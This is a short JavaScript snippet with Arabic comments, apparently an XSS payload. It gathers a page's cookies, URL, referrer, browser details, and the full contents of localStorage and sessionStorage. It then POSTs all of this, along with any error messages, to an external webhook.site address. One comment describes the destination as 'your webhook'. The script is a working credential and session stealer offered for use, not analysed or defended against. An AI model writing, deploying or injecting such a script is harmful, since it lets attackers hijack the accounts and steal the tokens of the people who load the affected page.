(function () {
  try {
    const data = {
      cookies: document.cookie || "[No Cookies]",
      location: window.location.href,
      referrer: document.referrer || "[No Referrer]",
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      time: new Date().toISOString(),
      localStorage: {},
      sessionStorage: {}
    };

    // قراءة محتوى localStorage
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      data.localStorage[key] = localStorage.getItem(key);
    }

    // قراءة محتوى sessionStorage
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      data.sessionStorage[key] = sessionStorage.getItem(key);
    }

    // إرسال البيانات إلى Webhook الخاص بك
    fetch("https://webhook.site/4b213de0-f8d2-46fc-bc4b-024c492d632f", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    });
  } catch (err) {
    // في حال حدوث خطأ، أرسل رسالة الخطأ أيضًا
    fetch("https://webhook.site/4b213de0-f8d2-46fc-bc4b-024c492d632f", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ error: err.toString() })
    });
  }
})();
